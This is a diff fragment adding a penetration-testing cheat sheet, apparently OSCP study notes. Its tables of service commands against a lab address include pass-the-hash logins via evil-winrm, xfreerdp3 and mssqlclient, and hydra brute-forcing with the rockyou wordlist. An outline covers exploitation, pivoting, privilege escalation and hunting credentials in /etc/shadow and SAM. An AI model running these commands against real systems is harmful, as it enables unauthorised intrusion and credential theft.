+|                 |         |                     | `xfreerdp3 /v:10.10.10.10 /u:user /pth:0123456789ABCDEF0123456789ABCDEF /cert-ignore`                                  |
+| **WinRM**       | 5985    | `evil-winrm`        | `evil-winrm -i 10.10.10.10 -u Administrator -p Pass123`                                                               |
+|                 |         |                     | `evil-winrm -i 10.10.10.10 -u Administrator -H AABBCCDDEEFF00112233445566778899`                                        |
+|                 |         |                     | `evil-winrm -i 10.10.10.10 -u Administrator -p Pass123 -S`  (SSL mode)                                                 |
+| **MySQL**       | 3306    | `mysql`             | `mysql -h 10.10.10.10 -u root -p`                                                                                      |
+| **PostgreSQL**  | 5432    | `psql`              | `psql -h 10.10.10.10 -U postgres`                                                                                      |
+| **MSSQL**       | 1433    | `impacket-mssqlclient.py` | `mssqlclient.py user@10.10.10.10 -windows-auth`                                                                    |
+|                 |         |                     | `mssqlclient.py user@10.10.10.10 -windows-auth -hashes :<NTLM_HASH>`                                                   |
+| **VNC**         | 5900    | `vncviewer`         | `vncviewer 10.10.10.10:5900`                                                                                           |
+|                 |         | `hydra`             | `hydra -P /usr/share/wordlists/rockyou.txt -t 4 vnc://10.10.10.10`                                                    |
+| **POP3**        | 110     | `hydra`             | `hydra -l user -P /usr/share/wordlists/rockyou.txt pop3://10.10.10.10`                                                 |
+| **IMAP**        | 143     | `hydra`             | `hydra -l user -P /usr/share/wordlists/rockyou.txt imap://10.10.10.10`                                                 |
+| **LDAP**        | 389     | `ldapsearch`        | `ldapsearch -x -h 10.10.10.10 -b "dc=example,dc=local"`                                                                |
+| **SNMP**        | 161     | `snmpwalk`          | `snmpwalk -v2c -c public 10.10.10.10`                                                                                   |
+| **NFS**         | 2049    | `showmount`         | `showmount -e 10.10.10.10`                                                                                             |
+|                 |         | `mount`             | `mount -t nfs 10.10.10.10:/share /mnt`                                                                                 |
+
+# Attack Vectors
+| Category               | Attack Vector / Tool                             | Description / Use Case                         |
+|------------------------|------------------------------------------------|-----------------------------------------------|
+| **Host Discovery**     | `ping`, `fping`, `arp-scan`, `nmap -sn`        | Identify live hosts on network                 |
+| **Port Scanning**      | `nmap -sS -sV -p-`, `rustscan`, `masscan`      | Discover open ports and running services       |
+| **Service Enumeration**| `enum4linux`, `smbclient`, `smbmap`, `ldapsearch`, `rpcclient`, `snmpwalk`, `nikto`, `wpscan`, `gobuster`, `feroxbuster` | Enumerate SMB, LDAP, SNMP, HTTP services and web content |
+| **Web Exploitation**   | SQL Injection (`sqlmap`), LFI/RFI, Command Injection, File Upload Bypass | Exploit web application vulnerabilities        |
+| **Common Service Exploits** | FTP (anonymous login), SMB (EternalBlue), MSSQL/MySQL (xp_cmdshell, UDF), Redis (unauthenticated write), RDP (bruteforce) | Service-specific exploitation techniques        |
+| **Tunneling & Pivoting**| SSH tunneling (`ssh -L/-R/-D`), tools like `chisel`, `ligolo`, `socat`, proxychains | Bypass network restrictions, access internal hosts |
+| **Priv Esc (Linux)**   | `sudo -l`, SUID binaries, kernel exploits (Dirty COW, Dirty Pipe), writable cron/systemd | Escalate privileges on Linux systems            |
+| **Priv Esc (Windows)** | AlwaysInstallElevated, Unquoted service paths, weak service perms, token impersonation (JuicyPotato) | Windows privilege escalation techniques          |
+| **Credential Hunting** | Extract hashes from `/etc/shadow`, SAM; check bash history, config files | Find credentials for lateral movement or privilege escalation |
+
+1. Host Discovery
+- `ping`, `fping`, `arp-scan`
+- `nmap -sn`
+
+2. Port Scanning
+- `nmap -sS -sV -p-`
+- `rustscan`, `masscan`
+
+3. Service Enumeration
+- SMB: `enum4linux`, `smbclient`, `smbmap`, `crackmapexec`
+- LDAP: `ldapsearch`, `ldapenum`
+- SNMP: `snmpwalk`
+- RPC: `rpcclient`
+- HTTP/Web: `nikto`, `whatweb`, `wpscan`, `gobuster`, `feroxbuster`
+
+4. Web Exploitation
+- SQL Injection (Error, Blind, Time-based): `sqlmap`, manual payloads
+- LFI/RFI and Path Traversal
+- Command Injection
+- File Upload Vulnerabilities
+- CSRF, XSS (less common for OSCP)
+
+5. Common Service Exploits
+- FTP: anonymous login, weak creds
+- SMB: EternalBlue, weak shares
+- MSSQL/MySQL: xp_cmdshell, UDF uploads
+- Redis: unauthenticated write
+- RDP: brute-force with `hydra`, `ncrack`
+
+6. Tunneling and Pivoting
+- SSH tunneling: `ssh -L`, `-R`, `-D`
+- Tools: `chisel`, `ligolo`, `socat`
+- Proxychains setup and usage
+
+7. Privilege Escalation (Linux)
+- `sudo -l`
+- SUID binaries
+- Kernel exploits (e.g., Dirty COW, Dirty Pipe)
+- Writable cron jobs / systemd services
+
+8. Privilege Escalation (Windows)
+- AlwaysInstallElevated policy
+- Unquoted service paths
+- Weak service permissions
+- Token impersonation exploits (JuicyPotato, RottenPotato, etc.)
+
+9. Credential Hunting
+- `/etc/passwd`, `/etc/shadow`, SAM
+- History files and config files
+- Scripts or backups with credentials
